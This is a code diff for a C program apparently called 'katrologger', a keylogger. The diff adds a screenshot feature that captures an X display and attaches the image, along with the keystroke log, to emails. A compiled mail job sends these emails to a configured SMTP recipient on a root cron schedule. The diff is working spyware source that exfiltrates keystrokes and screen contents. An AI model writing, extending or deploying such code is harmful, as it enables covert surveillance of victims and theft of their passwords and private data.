@@ -6,6 +6,7 @@ void smtp_mail(int argc, char **argv){
   FILE *append_smtp_file = fopen(smtp_log, "a");
   FILE *fd_cron_file;
   int port;
+  int flag_screenshot = 0;
   int secure_smtp;
   char send_smtp[1024] = "";
   char smtp_buffer[2048] = "";
@@ -15,6 +16,7 @@ void smtp_mail(int argc, char **argv){
   char mail_rcpt[256] = "";
   char upload_file[256] = "";
   char time[24] = "";
+  char display[8] = "";
 
   for (int arg = 0; arg < argc; arg++) {
 
@@ -44,7 +46,7 @@ void smtp_mail(int argc, char **argv){
           FILE *path_smtpfile = fopen(outfile, "a");
           if (path_smtpfile == NULL)
           {
-            printf("katrologger: Specified path does not exist: %s\nkatrologger: try 'katrologger --help'\n", outfile);
+            printf("katrologger: specified path does not exist: %s\nkatrologger: try 'katrologger --help'\n", outfile);
             exit(1);
           }
       } else if ( (strcmp(argv[arg], "--time") ) == 0) {
@@ -56,6 +58,22 @@ void smtp_mail(int argc, char **argv){
                   printf("Error Time Incorrect: %s\nExemple: --time 1-60 Minutes \n", argv[arg]);
               exit(1);
           }
+      } else if ( (strcmp(argv[arg], "--screen") ) == 0) {
+        arg++;
+
+        if (argv[arg] == NULL) {
+          strcpy(display, ":0"); // Default display session
+        } else {
+          strcpy(display, argv[arg]);
+        }
+
+        Display *check_xorg = XOpenDisplay(display);
+        if(check_xorg == NULL){
+          fprintf(stderr, "Given display cannot be found, exiting: %s\n", display);
+          exit(1);
+        } else{
+          flag_screenshot = 1;
+        }
       }
   }
 
@@ -103,13 +121,21 @@ fprintf(mail_job, "quickmail_initialize();\n");
 fprintf(mail_job, "quickmail mailobj = quickmail_create(\"%s\", \"Katrologger\");\n", mail_from);
 fprintf(mail_job, "quickmail_add_to(mailobj, \"%s\");\n", mail_rcpt);
 fprintf(mail_job, "quickmail_add_attachment_file(mailobj, \"%s\", NULL);\n", outfile);
+if (flag_screenshot == 1) {
+fprintf(mail_job, "quickmail_add_attachment_file(mailobj, \"/root/.katrologger/screenshots/screenshot.png\", NULL);\n");
+}
 fprintf(mail_job, "%s(mailobj, \"%s\", %d, \"%s\", \"%s\");\n", send_smtp, smtp_url, port, mail_from, mail_pass);
 fprintf(mail_job, "quickmail_destroy(mailobj);\n}\n");
 fclose(mail_job);
 system("gcc /root/.katrologger/run/mailjob.c -o /root/.katrologger/run/mailjob -lquickmail -w");
 
 if( (fd_cron_file = fopen(cron_file, "w") ) != NULL) {
-    snprintf(smtp_buffer, sizeof(smtp_buffer), "*/%s * * * * /root/.katrologger/run/mailjob\n", time);
+
+    if (flag_screenshot == 1) {
+      snprintf(smtp_buffer, sizeof(smtp_buffer), "*/%s * * * * export DISPLAY=%s; export XAUTHORITY=/home/rodrigobraz/.Xauthority; /root/.katrologger/run/screenshot %s; sleep 3; /root/.katrologger/run/mailjob\n", time, display, display);
+    } else {
+      snprintf(smtp_buffer, sizeof(smtp_buffer), "*/%s * * * * /root/.katrologger/run/mailjob\n", time);
+    }
     fprintf(fd_cron_file, smtp_buffer);
     fclose(fd_cron_file);
     chown(cron_file, 0, 108);
